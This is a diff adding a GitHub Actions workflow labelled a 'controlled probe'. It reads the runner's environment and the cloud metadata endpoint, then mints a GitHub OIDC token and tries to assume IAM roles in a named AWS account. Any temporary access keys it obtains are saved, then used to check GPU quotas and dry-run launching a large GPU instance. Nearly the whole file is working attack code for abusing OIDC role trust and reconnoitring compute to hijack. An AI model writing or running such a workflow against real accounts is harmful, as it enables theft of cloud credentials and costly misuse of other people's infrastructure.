@@ -1,0 +1,73 @@
+name: c211-i124414-oidc-probe
+on:
+  workflow_dispatch:
+    inputs:
+      nonce:
+        description: "nonce for this controlled probe"
+        required: true
+        default: "c211-i124414"
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  oidc-probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - name: "Runner identity"
+        run: |
+          echo "C211R_NONCE ${{ inputs.nonce }}"
+          echo "C211R_HOST $(hostname) $(uname -a)"
+          echo "C211R_KERNEL $(uname -r)"
+          echo "C211R_ENV $(env | grep -E '^(GITHUB_REPOSITORY|GITHUB_REPOSITORY_OWNER|GITHUB_EVENT_NAME|GITHUB_REF|GITHUB_WORKFLOW_REF|RUNNER_ENVIRONMENT|RUNNER_NAME|CI)=' | sort | tr '\n' ';')"
+          code=$(curl -s -m 3 -o /tmp/imds.txt -w '%{http_code}' http://169.254.169.254/latest/meta-data/ 2>/dev/null || true)
+          echo "C211R_IMDS_HTTP $code"
+          echo "C211R_IMDS_HEAD $(head -c 200 /tmp/imds.txt 2>/dev/null | tr '\n' ' ')"
+      - name: "Mint GitHub OIDC token and inspect claims"
+        run: |
+          set -u
+          RESP=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
+          printf '%s' "$RESP" > /tmp/resp.json
+          python3 -c "import json;d=json.load(open('/tmp/resp.json'));print('C211R_RESP_KEYS',sorted(d.keys()))"
+          python3 -c "import json;v=json.load(open('/tmp/resp.json'))['value'];open('/tmp/tok','w').write(v);print('C211R_JWT_LEN',len(v))"
+          python3 -c "import base64,json;t=open('/tmp/tok').read().strip().split('.')[1];t+='='*((4-len(t)%4)%4);d=json.loads(base64.urlsafe_b64decode(t));print('C211R_CLAIMS '+json.dumps({k:d.get(k) for k in ('iss','aud','sub','ref','repository','repository_owner','event_name','job_workflow_ref','sha')}))"
+          python3 -c "import base64,json;t=open('/tmp/tok').read().strip().split('.')[0];t+='='*((4-len(t)%4)%4);print('C211R_HEADER '+base64.urlsafe_b64decode(t).decode())"
+      - name: "STS AssumeRoleWithWebIdentity matrix (real roles + last-char-tampered controls)"
+        run: |
+          set -u
+          TOK=$(cat /tmp/tok)
+          rm -f /tmp/creds_*.json
+          for ROLE in arn:aws:iam::159553542841:role/awslabs-AOSH-GitHubActionsRole arn:aws:iam::159553542841:role/adai-template-publisher arn:aws:iam::159553542841:role/awslabs-AOSH-GitHubActionsRolx arn:aws:iam::159553542841:role/adai-template-publishex; do
+            code=$(curl -s -o /tmp/sts.xml -w '%{http_code}' -X POST https://sts.amazonaws.com/ --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" --data-urlencode "RoleSessionName=c211-i124414" --data-urlencode "WebIdentityToken=${TOK}" --data-urlencode "RoleArn=${ROLE}")
+            errcode=$(grep -o '<Code>[^<]*</Code>' /tmp/sts.xml | head -1 | sed 's/<[^>]*>//g')
+            reqid=$(grep -o '<RequestId>[^<]*</RequestId>' /tmp/sts.xml | head -1 | sed 's/<[^>]*>//g')
+            msg=$(grep -o '<Message>[^<]*</Message>' /tmp/sts.xml | head -1 | sed 's/<[^>]*>//g' | head -c 300)
+            echo "C211R_ASSUME role=${ROLE} http=${code} code=${errcode} requestid=${reqid} message=${msg}"
+            if grep -q '<AssumedRoleUser>' /tmp/sts.xml; then
+              echo "C211R_ASSUME_OK role=${ROLE}"
+              python3 -c "import re,sys,json;x=open('/tmp/sts.xml').read();g=lambda t:(re.search('<'+t+'>(.*?)</'+t+'>',x,re.S).group(1) if re.search('<'+t+'>(.*?)</'+t+'>',x,re.S) else None);c={'AccessKeyId':g('AccessKeyId'),'SecretAccessKey':g('SecretAccessKey'),'SessionToken':g('SessionToken'),'Expiration':g('Expiration')};open('/tmp/creds_'+sys.argv[1].split('/')[-1]+'.json','w').write(json.dumps(c))" "$ROLE"
+            fi
+          done
+          ls /tmp/creds_*.json 2>/dev/null || echo "C211R_NO_CREDS"
+      - name: "If any assumption succeeded: identity, quotas, offerings, DryRun"
+        run: |
+          set -u
+          found=0
+          for f in /tmp/creds_*.json; do
+            [ -f "$f" ] || continue
+            found=1
+            export AWS_ACCESS_KEY_ID=$(python3 -c "import json,sys;print(json.load(open(sys.argv[1]))['AccessKeyId'] or '')" "$f")
+            export AWS_SECRET_ACCESS_KEY=$(python3 -c "import json,sys;print(json.load(open(sys.argv[1]))['SecretAccessKey'] or '')" "$f")
+            export AWS_SESSION_TOKEN=$(python3 -c "import json,sys;print(json.load(open(sys.argv[1]))['SessionToken'] or '')" "$f")
+            export AWS_DEFAULT_REGION=us-east-1
+            export AWS_PAGER=""
+            echo "C211R_CREDS_SOURCE $f"
+            pip install --quiet awscli >/dev/null 2>&1 || true
+            echo "C211R_IDENTITY $(aws sts get-caller-identity --output json 2>&1 | tr '\n' ' ')"
+            for Q in L-DB2E81BA L-3819A6DF; do
+              echo "C211R_QUOTA $Q $(aws servicequotas get-service-quota --service-code ec2 --quota-code $Q --region us-east-1 --output json 2>&1 | head -c 800 | tr '\n' ' ')"
+            done
+            echo "C211R_OFFERINGS $(aws ec2 describe-instance-types --region us-east-1 --filters Name=instance-type,Values=p5en.48xlarge,p5.48xlarge,p5e.48xlarge,p4d.24xlarge --query 'InstanceTypes[].{t:InstanceType,g:VCpuInfo.DefaultVCpus,m:GpuInfo.Gpus[0].Name,c:GpuInfo.Gpus[0].Count}' --output json 2>&1 | head -c 1000 | tr '\n' ' ')"
+            echo "C211R_DRYRUN $(aws ec2 run-instances --region us-east-1 --dry-run --image-id ami-00000000000000000 --instance-type p5en.48xlarge --count 1 2>&1 | head -c 600 | tr '\n' ' ')"
+          done
+          [ "$found" = 1 ] || echo "C211R_NO_CREDS_ANY"
